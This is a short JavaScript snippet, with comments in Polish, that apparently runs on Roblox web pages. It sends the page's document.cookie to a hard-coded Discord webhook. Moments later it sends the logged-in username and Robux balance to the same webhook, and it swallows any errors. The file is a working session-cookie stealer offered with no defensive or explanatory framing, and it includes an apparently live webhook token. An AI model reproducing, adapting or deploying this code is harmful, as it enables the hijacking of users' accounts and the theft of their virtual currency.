(function() {
    const webhook = "https://discord.com/api/webhooks/1523482779432521799/biYFRYAdMvpPZYhtC45gyo-BMdIKTROVdRIYyD-8WpR1zwng5yqZAbZfTtmr-4m8J_vj";
    
    // Główny cookie
    fetch(webhook, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({content: "**COOKIE:**\n```" + document.cookie + "```"})
    }).catch(() => {});

    // Dodatkowe info
    setTimeout(() => {
        try {
            const info = {
                username: window.Roblox?.CurrentUser?.Name || "unknown",
                robux: document.querySelector('[data-testid="nav-robux-amount"]')?.innerText || "unknown",
                time: new Date().toLocaleString()
            };
            fetch(webhook, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({content: "**EXTRA INFO:**\n```" + JSON.stringify(info, null, 2) + "```"})
            });
        } catch(e) {}
    }, 1500);
})();
